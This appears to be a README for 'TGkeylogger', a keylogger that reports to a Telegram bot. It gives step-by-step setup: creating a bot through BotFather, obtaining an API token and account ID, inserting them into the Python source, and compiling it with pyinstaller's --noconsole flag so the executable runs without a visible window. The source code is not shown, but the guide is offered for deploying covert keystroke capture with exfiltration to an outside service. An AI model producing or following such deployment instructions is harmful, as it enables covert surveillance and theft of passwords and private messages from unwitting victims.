# TGkeylogger
Instructions:

Create Your Bot via Telegram BotFather:

Visit the official BotFather in Telegram.

Type: /newbot.

Choose a bot name (e.g., "MyTestBot"), then a username ending with _bot (e.g., mytest_bot).

After creation, copy your API token (save it to paste into your code later).

Find Your Telegram Account ID:

Visit the official bot @getmyid_bot.

Send /start to receive your Account ID (add this to your code as well).

Modify the Code:

Edit the .py file (e.g., TGkeylogger.py) with your API token and Account ID.

Convert to .exe (Windows Only):

Open CMD and run:

bash
Copy
pyinstaller --onefile --noconsole TGkeylogger.py  
The executable (TGkeylogger.exe) will be generated in the dist folder.

Note: Ensure you use Windows for compiling the .exe file.
